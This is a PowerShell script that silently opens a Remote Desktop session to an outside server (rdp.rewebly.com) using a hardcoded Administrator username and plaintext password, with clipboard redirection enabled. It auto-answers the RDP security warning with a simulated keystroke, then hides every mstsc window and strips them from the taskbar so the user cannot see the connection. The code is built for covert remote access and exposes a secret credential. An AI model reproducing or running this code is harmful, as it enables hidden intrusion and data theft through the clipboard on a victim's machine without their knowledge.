# --- CONFIGURATION ---
$server = "rdp.rewebly.com"
$username = "Administrator"
$password = "!Mamoute901901a"

# --- Embedded RDP file content ---
$rdpContent = @"
full address:s:$server
username:s:$username
redirectclipboard:i:1
screen mode id:i:2
authentication level:i:2
enablecredsspsupport:i:1
prompt for credentials:i:0
"@
$rdpFile = "$env:TEMP\hidden.rdp"
Set-Content -Path $rdpFile -Value $rdpContent -Encoding ASCII

# --- Store credentials using cmdkey ---
cmdkey /generic:TERMSRV/$server /user:$username /pass:$password

# --- Launch RDP session ---
$proc = Start-Process -FilePath "mstsc.exe" -ArgumentList $rdpFile -WindowStyle Minimized -PassThru

# --- Fast Alt+N on window detection ---
Add-Type -AssemblyName System.Windows.Forms
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
}
"@

# Wait and check for the RDP trust dialog
for ($i = 0; $i -lt 30; $i++) {
    $hwnd = [Win32]::FindWindow("#32770", "Remote Desktop Connection security warning")
    if ($hwnd -ne [IntPtr]::Zero) {
        # Send Alt+N immediately
        [System.Windows.Forms.SendKeys]::SendWait("%n")
        break
    }
    Start-Sleep -Milliseconds 100
}

# --- Hide all mstsc.exe windows ---
if (-not ([System.Management.Automation.PSTypeName]'Win32Enum').Type) {
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class Win32Enum {
        public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
        [DllImport("user32.dll")]
        public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll")]
        public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
        [DllImport("user32.dll")]
        public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
        [DllImport("user32.dll")]
        public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
        [DllImport("user32.dll")]
        public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
    }
"@
}

$mstscId = $proc.Id
$handles = @()

$callback = [Win32Enum+EnumWindowsProc]{
    param($hWnd, $lParam)
    $out = 0
    [Win32Enum]::GetWindowThreadProcessId($hWnd, [ref]$out) | Out-Null
    if ($out -eq $mstscId) { $script:handles += $hWnd }
    return $true
}

[Win32Enum]::EnumWindows($callback, [IntPtr]::Zero) | Out-Null

foreach ($hwnd in $handles) {
    [Win32Enum]::ShowWindowAsync($hwnd, 0) # SW_HIDE
    $exStyle = [Win32Enum]::GetWindowLong($hwnd, -20)
    $newExStyle = ($exStyle -bor 0x00000080) -band (-bnot 0x00040000)
    [Win32Enum]::SetWindowLong($hwnd, -20, $newExStyle) | Out-Null
}
